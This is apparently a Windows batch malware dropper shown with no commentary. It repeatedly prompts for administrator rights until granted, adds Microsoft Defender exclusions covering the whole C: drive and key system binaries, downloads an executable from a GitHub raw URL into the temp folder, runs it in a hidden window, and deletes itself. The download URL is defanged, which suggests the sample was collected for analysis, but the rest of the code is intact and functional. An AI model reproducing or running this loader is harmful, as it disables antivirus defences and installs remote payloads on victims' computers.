@echo off
NET SESSION >nul 2>&1
if %errorlevel% == 0 (
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ('C:\\', 'C:\\cmd.exe', 'C:\\conhost.exe', 'C:\\cvtres.exe', 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSbuild.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Windows\\System32\\Wscript.exe')" >nul 2>&1
    
    powershell -Command "Invoke-WebRequest -Uri ('hxxps://github[.]com/boycots563/wlt56/raw/main/zuwax.exe') -OutFile ('%TEMP%\\RBrk.exe')" >nul 2>&1
    
    :wait_dl
    if not exist "%TEMP%\\RBrk.exe" (
        timeout /t 1 >nul
        goto wait_dl
    )
    
    powershell -WindowStyle Hidden -Command "Start-Process ('%TEMP%\\RBrk.exe')"
    
    del "%~f0" >nul 2>&1
    exit
)

:retry_admin
    powershell -WindowStyle Hidden -Command "Start-Process ('%~f0') -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
    if %errorlevel% NEQ 0 (
        timeout /t 3 >nul
        goto retry_admin
    )
    
    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ('C:\\', 'C:\\cmd.exe', 'C:\\conhost.exe', 'C:\\cvtres.exe', 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSbuild.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Windows\\System32\\Wscript.exe')" >nul 2>&1
    
    powershell -Command "Invoke-WebRequest -Uri ('hxxps://github[.]com/boycots563/wlt56/raw/main/zuwax.exe') -OutFile ('%TEMP%\\RBrk.exe')" >nul 2>&1
    
    :wait_dl_retry
    if not exist "%TEMP%\\RBrk.exe" (
        timeout /t 1 >nul
        goto wait_dl_retry
    )
    
    powershell -WindowStyle Hidden -Command "Start-Process ('%TEMP%\\RBrk.exe')"
    
    del "%~f0" >nul 2>&1
    exit
